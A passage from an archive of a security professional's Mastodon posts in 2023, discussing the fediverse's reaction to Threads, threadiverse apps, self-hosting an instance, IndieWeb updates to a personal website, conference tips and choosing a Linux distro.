a better avenue to bring this up in lmk! I saw we don‚Äôt have any blocked instances yet, Best, Em Oh and here‚Äôs a link to some of the stuff (specifically about being banned by lemmy. world): https://exploding-heads. com/post/159028 shellsharks @shellsharks 2023-06-28T19:19:14Z For those getting into the #threadiverse, you may find my newly published &quot;guide&quot; (and commentary) interesting/useful! https://shellsharks. com/threadiversal-travel. Appreciate any and all feedback. edit: #kbin #lemmy #redditmigration shellsharks @shellsharks 2023-06-28T19:21:03Z @tweedge Not sure if the larger mod team over at r/cybersecurity would have any interest in this https://shellsharks. com/threadiversal-travel. Appreciate any feedback for sure! shellsharks @shellsharks 2023-06-28T21:11:20Z @jerry would be interesting to see a report of infosec. exchange (+ all the other Jerry-galaxy instances) funding and costs breakdown. Especially if there‚Äôs a deficit or if we‚Äôre close at all to a deficit. As other properties (within your sphere, e. g. #Fedia #infosecpub) grow and costs with it, it‚Äôd be good for the community to be able to react and increase support. Maybe annual report or something‚Ä¶ just a thought! Personally, I think it‚Äôd be great for community contributions to not only cover server/hosting costs (with some growth surplus) but also compensate you for your time and expertise. shellsharks @shellsharks 2023-06-29T03:42:00Z @beep #SpecterOps @SpecterOps https://posts. specterops. io/ is always a must-read for me. shellsharks @shellsharks 2023-06-29T20:13:10Z @tchambers @christianselig @fediversereport @fediversenews @fediverseobserver I created this ‚Äúguide‚Äù for those venturing into the #threadiverse - https://shellsharks. com/threadiversal-travel.

Glad you enjoyed the threadiverse post. Yes, I am interested in the project and would love to help out if I can. Let me know what ya need. shellsharks @shellsharks 2023-07-04T13:49:50Z @chiefgyk3d üôã‚Äç‚ôÇÔ∏è shellsharks @shellsharks 2023-07-04T14:06:27Z @cyb3rkitties I‚Äôve got one if you need. Just lemme know and I‚Äôll send. shellsharks @shellsharks 2023-07-04T14:11:01Z @cyb3rkitties nope! You just need the code. Enjoy! bsky-social-2gy2n-iqzds shellsharks @shellsharks 2023-07-04T16:38:20Z @securingdev I think it‚Äôs mostly just curiosity and some FOMO. Once you get over there though‚Ä¶ - You realize you‚Äôre not missing out on anything. Curiosity satiated pretty quick. - No engagement- Pretty much 99% shit posting (which actually makes it a decent place to fire nonsense into the void if that‚Äôs you‚Äôre thing)- Come back to Mastodon, poke Bsky once a week or so just to see if it moves. It‚Äôs definitely not because ‚ÄúMastodon is too hard‚Äù. shellsharks @shellsharks 2023-07-05T10:50:12Z @edu4rdshl I ‚Äòm not a high volume poster but when I do post it‚Äôs typically about infosec or tech. Good to have ya here! shellsharks @shellsharks 2023-07-05T16:51:22Z I think de-federation (especially prematurely) is antithetical to the &quot;exchange&quot; part of infosec. exchange and harmful to the larger idea of a social network in general. Those who support de-federation see Meta as a bad actor and the Fediverse has the ability to de-federate as a way to handle a bad actor, but for all Meta will do (i. e. data harvesting), de-federation seems to not be a particularly effective cure. If it was merely cutting threads off that&#39;d be one thing and though I wouldn&#39;t support that either, it would have no effect on what anyone here (including me) has built so far. But the &quot;de-federate from all who federate with threads&quot; drive will not only split the Fediverse into two in a way that maybe has never been done before, in turn ripping apart everyone&#39;s connections but it also sets a very dangerous precedent. End of the day, this (or anything else really) isn&#39;t going to &quot;kill&quot; the Fediverse or Mastodon or w/e, but this type of fracturing I think has the real possibility of sending (parts of) Mastodon back into pre-2022 levels of obscurity with even worse nth-order effects as people scramble to move instances, create alt accounts, get annoyed, etc. . . üëÅÔ∏è shellsharks @shellsharks 2023-07-05T17:03:54Z People out here tootin&#39; in public then get upset about *their* privacy being violated. shellsharks @shellsharks 2023-07-05T17:11:34Z So if I stand up a solo instance which (initially) has access to both sides of the #fedipact divide will I need to be manually hunted down by the #antithreads admins and de-federated or are they auto blocking any instance who federates with #threads? Interesting days ahead. . . shellsharks @shellsharks 2023-07-05T17:34:22Z @soleblaze I‚Äôd understand if this whole thing was effective at stopping Meta do the bad things they wanna do but it doesn‚Äôt seem like that will be the effect. Instead, it punishes not only new users who come in on the threads boat but more severely punishes existing fediverse community through fracturing and villainizing folks (if you‚Äôre not with us you‚Äôre against us kinda mindset). shellsharks @shellsharks 2023-07-05T17:35:19Z @jerry @AMS Guess I know what I‚Äôll be doing tonight. Got any suggestions for hosting a small/single-user instance (of Mastodon or Calckey even)? shellsharks @shellsharks 2023-07-05T17:41:08Z @mttaggart @jerry @AMS Let me know what you go with hosting-wise. Do t mind spending some $$ monthly but would prefer to go with something I manage. shellsharks @shellsharks 2023-07-05T18:18:35Z @jerry @mttaggart @AMS masto. host seems east enough but I probably would want more control over the config then they would give me. And not sure how east it would be to port things out of there to a self-hosted or other managed provider later. shellsharks @shellsharks 2023-07-05T18:20:36Z @jerry @mttaggart @AMS I‚Äôm not 100% on this idea yet tbh. I‚Äôve loved my stay here on infosec. exchange so far but if I can circumvent the fedipactpocalypse by being too small to de-federate and maintain connections on both sides it may be worth it. shellsharks @shellsharks 2023-07-05T20:56:12Z @DaveMWilburn @jerry I‚Äôm all for Jerry‚Äôs health but actively encourage his domain shopping sprees. shellsharks @shellsharks 2023-07-05T23:03:01Z @jerry to understand this one must first define ‚Äúenfartification‚Äù. shellsharks @shellsharks 2023-07-06T00:56:25Z Got on #threads (bcuz of course) and after following like 3 accounts the app went haywire and started blasting my timeline with posts/accounts I don‚Äôt follow based on their algo. Gotta say, my fav thing about Mastodon is I only see what I follow (and what those follows boost). Admittedly, this level of curation takes time and I suppose the average person doesn‚Äôt have the energy to do it. But for me it‚Äôs better. That said, if they do in fact add ActivityPub support and truly federate, I‚Äôll be stoked to have the ability to follow threads. net accounts from here. shellsharks @shellsharks 2023-07-06T17:42:24Z I&#39;ve always tried to maintain two(ish) personas online, personal and professional (infosec). Over time these lines definitely have blurred but I still tend to have two separately maintained identities, e. g. LinkedIn vs Facebook (which I haven&#39;t really used in years), two Twitter accounts, two Mastodon accounts, etc. . . For my &quot;personal&quot; social media usage, honestly I could go anywhere - Mastodon, Threads, BlueSky, w/e. For #infosec, I want to be where other infosec people are, and I need the ability to have a curated (just who I follow) feed, which is what Mastodon gives me. I came over to infosec. exchange/Mastodon in earnest in late 2022 during one of the larger Twitter exoduses as did many other infosec folks. I really hope people keep at least their infosec selves here and continue to engage/contribute but with all these new entrants (BlueSky, Threads, Spill, w/e) and other drama with fedipact fracturing, I&#39;m a little worried the infosec-specific timeline and engagement could dry up. FWIW, I am committed to #Mastodon and the larger #Fediverse as my professional/tech-chat home for the long term and hope to see (at least) this specific community continue to grow! shellsharks @shellsharks 2023-07-06T17:52:04Z A little more on this. . . I&#39;ve always felt the need to maintain two identities not because I was worried about those in my professional sphere being exposed to my personal sphere/chatter (or vice versa) but because I always appreciated those that I followed that kept their personal chatter to a minimum. Now I understand maintaining two identities like this is tough and certainly don&#39;t fault anyone for posting non-work things on their social accounts (i. e. maintaining a single all-encompassing identity), but I wanted to at least try to be that for others. Even if #Mastodon fades into relative obscurity and ceases to be a place where I can get breaking infosec news and conversations about infosec going, I feel good in my backup strategy of leveraging my comprehensive infosec #RSS library (https://shellsharks. com/infosec-blogs) for read-only news and the #threadiverse /similar platforms for conversation. shellsharks @shellsharks 2023-07-06T18:17:00Z @GossiTheDog #tootroot? Genius üòÇ. You coin this yourself (https://cyberplace. social/@GossiTheDog/110667416012211236)? It&#39;s about to make the list --&gt; https://shellsharks. com/designer-vulnerabilities shellsharks @shellsharks 2023-07-06T18:23:52Z @chiefgyk3d Hey, curious what your Mastodon self-host setup looks like. Been thinking of tinkering around with a solo/small instance myself but unsure with what to go with. I want to host it myself rather than using a managed provider (i. e. masto. host). Cheers! Saw this üëÄ(https://www. threads. net/t/CuXaLwYJAMi/?igshid=MzRlODBiNWFlZA==) shellsharks @shellsharks 2023-07-06T18:36:12Z @chiefgyk3d @mastohost Copy that! My two main questions/concerns on using masto. host (or similar managed provider) are. . . 1. I want to have a high character limit, much higher than 500c. My current instance is 13k max per post and I love it. 2. If for whatever reason I want to switch hosting providers or move to self-hosted, is it possible for me to port my instance OUT of the managed provider? How are you liking masto. host? I&#39;m definitely into the simplicity of it. shellsharks @shellsharks 2023-07-06T18:42:09Z @chiefgyk3d @mastohost 1) True, I suppose I could embrace threaded posts or simply move longer musings to a blog post on my site. 2) Ok ok ok nice. . . might have to just go with them then. Got some juicy domains that could be fun to use. (or I could go with social. shellsharks. com). . . shellsharks @shellsharks 2023-07-06T19:06:56Z @chiefgyk3d @mastohost Yeah, I&#39;m torn between leveraging my existing point of presence with shellsharks. com or throwing something on magical. network or enchanted. computer üòÜ shellsharks @shellsharks 2023-07-06T20:05:18Z If I do an account migration to another instance to try it out and then want to come back to this one would that work? Any weird things to look out for doing something like that? shellsharks @shellsharks 2023-07-06T20:09:57Z @Lajichris I‚Äôd want to keep the followers in-tact across migrations mostly. But curious what happens to posts from my initial stint on instance A. shellsharks @shellsharks 2023-07-06T23:48:30Z @Lajichris @jerry from the docs it seems like I would be able to move back but haven‚Äôt confirmed this yet shellsharks @shellsharks 2023-07-06T23:59:42Z @SeanWrightSec let‚Äôs all agree to stay here then üòÅ. We can have alts on threads to see Wendy‚Äôs dank memes though. shellsharks @shellsharks 2023-07-07T00:15:13Z @lmorchard Having spent a bit of time scrolling around #threads, tbh it IS kinda fun and people seem to be having fun. That said, I personally want a little more substance and authenticity out of my socializing. Mastodon, and the various communities/personalities I&#39;ve connected with here have given me that in a way that I haven&#39;t experience before and doubt Threads could match. shellsharks @shellsharks 2023-07-07T02:50:10Z @keefer Honestly, even for me I can tolerate a good ratio of personal : professional stuff coming from most people&#39;s feeds. But there are those who post like 10x+/day every day and &lt;1% is anything infosec/tech-adjacent. These accounts are typically &quot;influencer&quot; types who have managed to cobble together a large following which seems to go their head a bit =P. I&#39;m probably on the more extreme end of follow-pruning and I don&#39;t mind the personal stuff - easy enough to scroll by. Despite Twitter&#39;s many faults over the years, I *did* get some professional/infosec use out of it thanks to some high-fidelity feeds from cyber personalities and researchers. I aimed to be that while I was there, but never really found a niche posting anything out onto Twitter, so mostly I just lurked. I&#39;ve found on Mastodon that I have felt far more comfortable posting, engaging and things just seem very authentic. Because of this, the lines between the pure-infosec-professional persona and the &quot;everything else&quot; persona have blurred quite a bit. I&#39;ll probably continue to keep things separate to some degree but would actually encourage you and most people to just feel comfortable sharing non-infosec or non-professional stuff on the same account as everything else. Unless you&#39;re one of those super high volume posters I don&#39;t think you&#39;ll run the risk of annoying anyone or losing followers or w/e. If anything, you&#39;re more likely to build better, stronger connections - like, &quot;hey! that person who also works in infosec loves hiking and thinks alligators are cool! same as me!&quot; shellsharks @shellsharks 2023-07-07T11:21:36Z @tournesol @chiefgyk3d Yeah, but not sure if I can get that on managed mastodon (I. e. masto. host) shellsharks @shellsharks 2023-07-07T11:41:40Z @doot@glitterkitten. co. uk haven‚Äôt seen a single request for one since threads dropped. shellsharks @shellsharks 2023-07-07T17:53:45Z @paulsanders I know this game.

If they federate later then #threads -natives could follow journalists/news accounts across the #fediverse. So still some hope/viability for them yet. . . shellsharks @shellsharks 2023-07-07T19:18:40Z @serghei by some no doubt, but I suspect the instances which harbor a lot of journalists would not do this, thus threads-ers would have access. But yeah, like I said it will be interesting to see what A. Meta does in terms of actually support AP/federation as we have come to know it (i. e. allowing threads-folk full functionality)and B. what fedi-pact drama will come to pass. shellsharks @shellsharks 2023-07-07T19:53:23Z A (continuously updated) compilation of #threads ‚Äúwhere you at?‚Äù #infosec &amp; #tech posts‚Ä¶ - https://www. threads. net/t/CuX2wT4Ptc5/- https://www. threads. net/t/CuXAenHOmyr/- https://www. threads. net/t/CuVeNAdNpIS/- https://www. threads. net/t/CuYu2ILM0PR/- https://www. threads. net/t/CuWwhiEAscv/- https://www. threads. net/t/CuYXyhBgk7o/- https://www. threads. net/t/CuZ4Yr5x02T/- https://www. threads. net/t/CuaFy-avAU6/- https://www. threads. net/t/CuaI-Snt1n0/- https://www. threads. net/t/CucXh2EoHmU/- https://www. threads. net/t/CuXuhkAu3mj/- https://www. threads. net/t/Cuf5FNKsp0n/- https://www. threads. net/t/CuiJ5ukOGAX/- https://www. threads. net/t/CujlVhKtxIF/- https://www. threads. net/t/Cunjg2bLd0V/- (tech) https://www. threads. net/t/CuV-zQxgqGr- (tech) https://www. threads. net/t/CufXRP-yDF9/- (tech) https://www. threads. net/t/CufTQGag3vm/- (tech) https://www. threads. net/t/CuhanP5RsaM/- (tech) https://www. threads. net/t/CudbT8ts8oC/- (tech) https://www. threads. net/t/CuVzNXEr5V7/- (tech) https://www. threads. net/@voorhees_dnb/post/CyOxdmbyJHm/ shellsharks @shellsharks 2023-07-07T21:00:25Z Worst part of #threads joining the #fediverse (at some point) is the term #threadiverse which currently refers to fediverse-compatible Reddit-esque platforms (e. g. #kbin, #lemmy, etc‚Ä¶) will be used to refer to the threads app on the fediverse.

You can&#39;t stop a bad actor from wanting to data mine a public data set like this. That said, there are other *reasons* people have called for de-federation and they&#39;re not always things I can disagree with. Ultimately, I think people want to be social so let&#39;s not put up walls. People also should consider they have the power to block entire instances on their own without needing to go nuclear with de-federation. A quick google search pulled this https://nerdschalk. com/how-to-block-a-specific-instance-on-mastodon/. shellsharks @shellsharks 2023-07-09T22:24:40Z @Notpulpfiction fresh out.

AMA link: https://infosec. pub/post/503675 shellsharks @shellsharks 2023-07-12T17:19:13Z @soatok some more discoverability would be nice. Some ideas‚Ä¶ ‚ÄîAvailable functionality‚Äî- Hash tags: great way to current search for and subscribe to things you want to see (can get busy though depending on the tag)- Boosts: People who would compile a list of posts to see should probably just leverage boosts to help propel things in the Fediverse- Lists: you can create lists in Mastodon so presumably lists could be shared with others. ‚ÄîUnavailable‚Äî- Algos: Bluesky has a feature where there‚Äôs basically a ‚Äústore‚Äù for algos where you can get alternative timelines based on an algo of your choosing. This would be great because A. It‚Äôs optional and B. Gives users who want algo-level discoverability that option. shellsharks @shellsharks 2023-07-14T13:12:21Z @taylorparizo I‚Äôve been twice in the past 5 years, here‚Äôs some tips off the top of my head. . - It‚Äôs PACKED, so be prepared to do a lot of line-waiting and crowd navigating. This is especially true for Def Con which is super popular in a smaller venue than Black Hat. - Masks, hand sanitizer, etc‚Ä¶ It‚Äôs almost impossible to not get sick it seems but maybe you can avoid it with some mitigating controls. - Restaurants: Della‚Äôs kitchen has amazing food. Is BH still Mandalay? Burger Bar (which may be closed now) has great milkshakes. - Comfy shoes: If you love getting swag at the vendor hall and navigating the maze of walkways and tunnels of Vegas you will be putting a lot of miles on- As miserable as it typically is outside the casinos in Vegas, staying INSIDE the whole time is probably more damaging to your body/mind. Go breathe some fresh air and get some sun a couple times a day =). - Have fun! shellsharks @shellsharks 2023-07-14T15:05:17Z *New Blog Post*: A primer on ‚ÄúCrown Jewels Analysis‚Äù (ala MITRE) https://shellsharks. com/crown-jewels-analysis #infosec #mitre #cybersecurity shellsharks @shellsharks 2023-07-17T00:12:30Z A short piece on my discovery of the #indieweb.

The process of getting that up there really exposed my lack of web dev / CSS skills üòÖ (and I‚Äôm sure there are kinks left to work out). The menu helps bring some accessibility improvement for those who didn‚Äôt want to click-and-find-out on the fontawesome icons on my Home Screen, and brings exposure to some lesser trafficked pages around the site. Next up on my site overhaul, themes (i. e, dark/light mode toggle). Anyone have any tips on implementing that? #indieweb #blogging #webdev shellsharks @shellsharks 2023-07-19T14:20:52Z @superlime thanks!! the menu is scrollable since there‚Äôs lots of items in it. Curious what you‚Äôre seeing. shellsharks @shellsharks 2023-07-19T14:23:13Z @nonnullish bookmarked! Will be launching into this today. Might take a while since I have inline CSS (and sloppy CSS in general) everywhere. Looking to clean all this up. Any recs for best practice / standard hues for dark / light modes? I plan on having a third mode option which is effectively what the theme is today. So 3 total. As for the menu, I‚Äôll think about it. I use my phone in left-hand drive mostly (because I‚Äôm right handed and like to use mr R hand for other stuff while phone-ing). But not sure what is best practice I guess. shellsharks @shellsharks 2023-07-19T14:28:33Z @superlime lol. This is what I get for not testing in FF. Just chrome and Safari. I‚Äôll have to look at it. ü§¶‚Äç‚ôÇÔ∏è shellsharks @shellsharks 2023-07-19T14:33:58Z @superlime Weird. I don‚Äôt see it on desktop FF on my Mac.

I actually write about this here if you‚Äôre interested https://shellsharks. com/threadiversal-travel.

This works for user search in Mastodon and other third-party clients but does not seem to work in #ivory. Any ideas why? I suppose this would be a #featurerequest =). Thanks! shellsharks @shellsharks 2023-07-20T01:49:03Z @Em0nM4stodon Agreed. I&#39;ve been in a position of interview/hiring entry-level/junior folks and for me, I look mostly for two things A. Genuine interest (which can manifest in many ways, one of them being them having put time into learning at home in whatever form) and B. Willingness to learn, which can be somewhat quasi-detected with some questions and discussion. Certainly cons, certs, degrees, etc. . should not be the measure, especially for early-career individuals since how would they even have money to get these things. shellsharks @shellsharks 2023-07-20T01:53:11Z @retr0id These social media sites limiting posts to 250 chars or w/e are conditioning folks to have that much attention span I guess. It&#39;s been interesting lately. I main Mastodon (infosec. exchange instance specifically) and on here as you know we have 11k chars to work with for a single post. I often will draft something up here, fire it into the Fediverse and then attempt to cross-post the same thing on other platforms (e. g. Bluesky, Threads, wherever), but of course the char limit for single posts prevents me from forklifting it from Mastodon. So my options are break it up into multiple posts (too much work) or simply summarize / dumb-down the original post. I guess it says a lot about what these platform proprietors think of their patrons. . . shellsharks @shellsharks 2023-07-20T01:56:09Z @fox Here&#39;s the mega-load of #indieweb #infosec blogs/sites https://shellsharks. com/infosec-blogs#boutique-security-blogs.

You‚Äôre not the only one who likes rugby, F1 or anything else you mentioned. Blast your thoughts into the ‚Äòverse and you may be surprised what sings back. But you know what I‚Äôve found? You don‚Äôt need to be the one who always STARTS a thread. Instead, find posts that resonate with you or you want to engage with and respond. You can have meaningful interactions on social media without being the initial thread-er. shellsharks @shellsharks 2023-07-20T10:53:09Z @credmp This list https://docs. google. com/spreadsheets/d/1t13k5_cNhP9_TgoUmqDZk2ROkWkF6Bg3O5269vKIqWw/htmlview went wide yesterday and resulted in a lot of mass follows. Tons of people have been spouting off about all their new followers and attributing it to some new influx but it‚Äôs just that list. That said, I do think/hope the #infosec community has decided this is the landing spot. shellsharks @shellsharks 2023-07-20T11:47:32Z Asking for some help/tips from the #indieweb community out there. I&#39;m looking to add a #notes (https://indieweb. org/note) feature to my site but am struggling to figure out the best way to do it. Currently my site is hosted on GitHub Pages (so statically generated via Jekyll). I&#39;d prefer to implement something that plays well with Jekyll but am open to bolting something on or standing up functionality on a subdomain if that&#39;s better. In the pure IndieWeb sense I am looking to have all my notes permalinked and then #POSSE them out across the various services. Many thanks in advance! shellsharks @shellsharks 2023-07-20T12:21:54Z @gilmae Sounds promising. You wouldn‚Äôt happen to have a writeup on this setup would ya? üòÅ shellsharks @shellsharks 2023-07-20T13:37:04Z @aaronpk Hey! I&#39;ve just started getting into #indieweb -ifying my site and of course came across a lot of your work on the subject. I *really* like the notes capability of your site and aspire to build a similar capability on my own. Post note on site, syndicate out to places (mainly Mastodon) and then be able to receive standard web mention AND Mastodon-based replies inline as comments on the notes pages. My question for you is whether this is achievable using MicroBlog, Jekyll, Quill, Bridgy etc. . . Thanks for any guidance and thanks for all the great work you do on the site and at IndieWeb. org! Inspiring stuff for me =). shellsharks @shellsharks 2023-07-20T14:04:43Z @brettk I‚Äôm not fundamentally opposed to it. Just means more work for me getting things set up which I‚Äôm on the fence about whether I feel like taking on in the short term. shellsharks @shellsharks 2023-07-20T15:13:53Z How many #threadiverse (e. g. #kbin / #lemmy) clients do you have installed on your phone right now? shellsharks @shellsharks 2023-07-20T15:14:50Z I‚Äôm currently sampling 7 üòÖ shellsharks @shellsharks 2023-07-20T16:45:38Z @blhue from what I have been able to tell, all the Lemmy apps seem to work perfectly fine with kbin.

I‚Äôm still tuning the color palettes a bit but am comfortable enough with where things sit now. #indieweb #webdev #webdesign shellsharks @shellsharks 2023-07-23T15:44:14Z @bowlofeggs This is the way. üòà shellsharks @shellsharks 2023-07-23T18:40:02Z @jerry Critical Security Controls had some stuff on VM but not sure how I‚Äôm-depth you are looking for shellsharks @shellsharks 2023-07-24T00:07:51Z @jerry I love a good desk setup share. shellsharks @shellsharks 2023-07-24T15:34:42Z @ElleGray My response is zzz‚Ä¶ üò¥ shellsharks @shellsharks 2023-07-25T04:03:26Z shellsharks. com now sports h-card (https://shellsharks. com/about) and h-entry (on all posts) markup! #indieweb #openweb shellsharks @shellsharks 2023-07-25T14:39:42Z @0xtibs I wrote about my ‚Äújourney‚Äù here https://shellsharks. com/training-retrospective#my-education-journey shellsharks @shellsharks 2023-07-28T19:31:56Z @cybersoldier remember seeing this before https://github. com/Flockingbird/roost. Not sure there‚Äôs an active instance of it. shellsharks @shellsharks 2023-07-31T00:00:21Z @mttaggart Going to try this on my wife now. Came across this unfortunate name collision trying to Google for it though https://firefish. io/. shellsharks @shellsharks 2023-07-31T12:08:32Z Adding a #firefish account to my iOS #ivory client resulted in a lot of crashing. ü§∑‚Äç‚ôÇÔ∏è shellsharks @shellsharks 2023-07-31T12:32:44Z @alrescha @jerry Yeah, don&#39;t get me wrong. I wasn&#39;t expecting it to work based on what I had seen others say was their experience, nor do I think it SHOULD work for the reason you just said. My word of caution is for others who might try this that it MAY bork their client like it did me üòÖ. A hard restart or reinstall may be needed. Also interesting since I had seen others (like Jerry) were unable to add it at all and I was able to (albeit with crashy results). shellsharks @shellsharks 2023-07-31T14:33:43Z @mttaggart yeah we got very excited about it - https://fedipact. veganism. social/ üòÖ shellsharks @shellsharks 2023-07-31T18:00:34Z @mttaggart sums up my experience as well. Not a drop of infosec stuff going on there. The few infosec folks who are on there mostly just shit post or other sorts of clout-chasing. I pop over every once in a while to see if anything has changed though. I still like how my handle is my domain name :-P. Very #indieweb ü§ò shellsharks @shellsharks 2023-07-31T21:23:22Z Who wants to roast my website (i. e. poke around and point out things I should add/fix/change)?

Thanks! https://shellsharks. com/ #roastmysite #indieweb #webdesign #webdev shellsharks @shellsharks 2023-07-31T21:32:32Z @felixthehat great idea on the font! For the text labels - I‚Äôm guessing you mean on the icons on the home page. I‚Äôm so torn because I love the way it looks with no text but concede that unless you‚Äôre me you won‚Äôt know what you‚Äôre getting yourself into when clicking on a lot of those icons haha. Any ideas for how to thread the needle on this? Maybe a hover over text? (Which wouldn‚Äôt do much forMobile users‚Ä¶) shellsharks @shellsharks 2023-07-31T21:35:35Z @tychotithonus if I‚Äôm missing anything 101 it‚Äôs probably my fault haha. I used an off the shelf Jekyll theme years ago and have slowly ripped parts out and replaced with custom html/css/JS/etc‚Ä¶. I definitely am not ‚Äúclassically trained‚Äù in the art of webdev so I‚Äôve learned to just fix things in motion. shellsharks @shellsharks 2023-07-31T21:47:40Z @felixthehat ahhh. Interesting idea. Hadn‚Äôt thought of that shellsharks @shellsharks 2023-07-31T22:18:58Z @hey I have a dark(er) mode theme you can toggle to on the home page. Is that sufficient you think? I created themes for this reason since I had a few people mention to me readability issues with my color choices üòÖ shellsharks @shellsharks 2023-07-31T22:19:39Z @smutek great idea! Adding to the list. üòÅ shellsharks @shellsharks 2023-07-31T22:22:51Z @felixthehat I think you‚Äôre right.

Mind sharing a pic of what you‚Äôre seeing? shellsharks @shellsharks 2023-08-01T01:37:18Z @dieg0sec Hmm. It doesn‚Äôt scroll down any farther? What OS and browser are you on? Will admit I haven‚Äôt tested on all platforms. shellsharks @shellsharks 2023-08-01T10:41:48Z @hey Understandable. I need to add the feature where it sets the theme to system settings. Appreciate the feedback! shellsharks @shellsharks 2023-08-01T12:28:15Z @dieg0sec interesting. I did design it partially so you had to drag it up a bit to see it. But it displaying only half way isn‚Äôt a great look. I need an android device to do better testing :-/. I‚Äôll look into it. Appreciate you letting me know!! shellsharks @shellsharks 2023-08-01T13:13:21Z @C8H10N4O2 Hey! Thanks for lookin&#39;. I do actually have a security. txt at https://shellsharks. com/security. txt.

What&#39;s interesting is I have a whole writeup on security. txt https://shellsharks. com/security-txt and swear that wasn&#39;t in the very early spec. Very possible I glazed right over that point haha. I&#39;ll look into moving it! shellsharks @shellsharks 2023-08-01T15:15:14Z @felixthehat monospace font is a go!

So long-post away!! shellsharks @shellsharks 2023-08-02T12:46:13Z @jerry Hey, I messaged on Matrix in what I believe was a support channel but not really sure. Having an issue with my matrix account (matrix. infosec. exchange). I&#39;m still logged in on one of my devices but unable to change password or associate an email with the account. I was trying to log into a new client and realized my credentials weren&#39;t working. Any way you can help out with this? Appreciate it! shellsharks @shellsharks 2023-08-02T13:29:14Z @jerry hmm. I don‚Äôt think so. But if I did, what would I point matrix client to for auth? shellsharks @shellsharks 2023-08-02T15:37:03Z @jerry so would it work with the ‚ÄúElement X‚Äù client (iOS)? I don‚Äôt see that as an option. shellsharks @shellsharks 2023-08-02T15:48:19Z @jerry that explains things.

I can sub to #kbin magazines (communities) from Lemmy (and vice versa) so it doesn‚Äôt matter which you pick. Lemmy seems to be more mature so it‚Äôs the better experience so far for me. Both are run by @jerry so nothing to compare on the admin front (and you know they are well run). shellsharks @shellsharks 2023-08-06T13:19:03Z What are peoples thoughts on Proton mail (https://proton. me/)?

I&#39;m considering spinning up a new community (&quot;magazine&quot;) there but curious if it&#39;s still something you&#39;re invested in. I&#39;m also getting a 500 error when trying to view the magazines list on the server (https://fedia. io/magazines). Any idea what is goin on there? shellsharks @shellsharks 2023-08-08T11:55:58Z @siddhantgoel Hey! Thanks for getting back to me. I actually got an invite yesterday.

Loving the IndieWeb mention and the ditching of Twitter =). shellsharks @shellsharks 2023-08-08T21:27:42Z OK, so I have a #framework laptop on the way and am trying to decide on a #Linux distro to put on it. I‚Äôm going to main this laptop for dev-work, security research and maintaining my site. Who has opinions on what the best OS would be to use? I‚Äôm no Linux noob but also wouldn‚Äôt consider myself a pro by any means. Supported distros for framework include #Fedora, #Ubuntu, #Manjaro and #Mint (though I hear #Arch is possible too). Go! #askfedi shellsharks @shellsharks 2023-08-08T22:12:37Z @staticdragon true. I wanted something relatively stable/supported since I was going to ‚Äúmain‚Äù it. I‚Äôve never used Fedora (though I have used Red Hat) but it seems pretty promising. shellsharks @shellsharks 2023-08-08T22:13:07Z @aitorpazos I‚Äôll have to take a look at it. Wasn‚Äôt listed as a supported OS but I‚Äôm sure it would work regardless. shellsharks @shellsharks 2023-08-08T22:14:11Z @scleriot @frameworkcomputer very cool! Yeah I‚Äôve used Ubuntu and Debian probably the most so I‚Äôd be comfortable here for sure. shellsharks @shellsharks 2023-08-08T22:14:30Z @bmacDonald94 I‚Äôll take a look. Thanks! shellsharks @shellsharks 2023-08-08T22:16:24Z @corse_pia yeah I‚Äôve been kinda between Fedora and Mint mostly. For what I need (which isn‚Äôt honestly much) I could probably get by with any of them quite easily. shellsharks @shellsharks 2023-08-09T03:58:29Z @postmodern here‚Äôs something you might be able to get away with scanning https://demo. testfire. net/. It was meant for testing IBM scanners (when they owned them). Not sure what it‚Äôs used for these days. I used it a lot back in my AppScan days. shellsharks @shellsharks 2023-08-09T04:40:28Z @LovesTha Yeah I def want the ‚ÄúLinux-ey‚Äù feel and not anything like Windows haha üòÖ shellsharks @shellsharks 2023-08-09T05:03:20Z @postmodern hah oh well. Best I had for ya üòÅ shellsharks @shellsharks 2023-08-09T12:48:02Z @florenciocano Fedora is the leading contender for me right now I think. shellsharks @shellsharks 2023-08-09T15:40:53Z @dieg0sec I&#39;ve gotten a mention or two in other places. It looks like one of the suggested OS&#39;s on the Framework docs too. Anything about Mint you specifically like over other Distros? I&#39;m sort of between Fedora and Mint right now. I&#39;ve mostly used Debian-based distress in the past (Debian itself, Ubuntu, Kali, etc. . . ) so Mint is a natural fit but there is some allure with Fedora (though I don&#39;t know as much about the pkg manager, etc. . . ) shellsharks @shellsharks 2023-08-09T18:08:43Z @tennoseremel good point. I‚Äôll add a title element. Thanks! shellsharks @shellsharks 2023-08-09T18:12:32Z @tennoseremel gah! I‚Äôll have some research to do then. I have an item on my to do list to do a complete accessibility overhaul but just haven‚Äôt gotten to it yet. shellsharks @shellsharks 2023-08-10T04:25:03Z @Xavier One year I went every booth had a branded fidget spinner. Interesting times. . . #blackhat shellsharks @shellsharks 2023-08-10T11:32:46Z @dismantl here‚Äôs what i do. 1. If anything shows up in your feed you think is not-interesting, go look at that users profile / past posts. 2. If they have a habit of posting uninteresting things (like 4/5 of their past toots were meh) then maybe unfollow3. This is an easy call for me if they‚Äôre one of those that post multiple times a day, every. Single. Day. This process is a little laborious (especially if your follow list has ballooned) but it becomes second nature as you peruse your feed day to day so just make a habit of it. My feed is in great shape these days thanks to doing this for months. I rarely unfollow anyone these days. shellsharks @shellsharks 2023-08-11T12:57:31Z I&#39;ve written up a short comparison piece highlighting key differentiating features of two awesome #Mastodon clients, #Ivory and #Feditext https://shellsharks. com/notes/2023/08/11/ivory-vs-feditext shellsharks @shellsharks 2023-08-11T13:04:21Z @dharrison Awesome!

I‚Äôll be following along with the progress of the project and updating that post as things evolve. The inclusion of other, non-Mastodon instances is really the unbeatable feature of the app so far imo (among many other awesome, standout features). Btw, other than reporting feedback, what‚Äôs the best way to support development of the app? I did a quick search through the app and was linked to something that seemed to be related to Metabolist rather than the new dev team. Thanks! shellsharks @shellsharks 2023-08-12T11:14:25Z @0v1 Order of preference (for me) 1. Link to a blog post with a short excerpt on Mastodon. 2. Full-length post on Mastodon 3.

